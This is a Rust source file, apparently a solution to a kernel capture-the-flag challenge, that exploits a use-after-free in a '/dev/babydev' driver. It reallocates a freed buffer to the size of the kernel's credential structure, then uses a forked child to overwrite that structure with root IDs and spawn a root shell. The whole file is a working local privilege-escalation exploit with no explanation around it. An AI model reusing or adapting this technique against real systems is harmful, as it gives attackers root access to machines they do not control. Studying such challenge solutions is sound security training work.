use std::fs::OpenOptions;

use kpwn::all::*;

#[repr(C)]
#[derive(Default, Debug)]
struct FakeCred {
    pub usage: i32,
    pub uid: u32,
    pub gid: u32,
    pub euid: u32,
    pub egid: u32,
    pub suid: u32,
    pub sgid: u32,
}

fn main() {
    env_logger::builder()
        .filter_level(log::LevelFilter::Debug)
        .init();

    whoami();

    let dev = OpenOptions::new()
        .read(true)
        .write(true)
        .open("/dev/babydev")
        .unwrap();
    let dev2 = OpenOptions::new()
        .read(true)
        .write(true)
        .open("/dev/babydev")
        .unwrap();

    // Trigger realloc
    unsafe {
        assert_eq!(dev.ioctl_raw(0x10001, 0xA8), 0);
    }
    // Trigger free
    dev2.close().unwrap();

    fork_and_wait(|| {
        // Modify struct cred
        unsafe {
            let mut cred: FakeCred = dev.read_struct().unwrap();
            log::debug!("Cred = {:?}", cred);
            cred.uid = 0;
            cred.gid = 0;
            cred.euid = 0;
            cred.egid = 0;
            cred.suid = 0;
            cred.sgid = 0;
            dev.write_all_raw(&cred).unwrap();
        }

        whoami();
        execve_sh().unwrap();
        unreachable!()
    })
    .unwrap();

    log::info!("Exploit end");
    dev.close().unwrap();
}
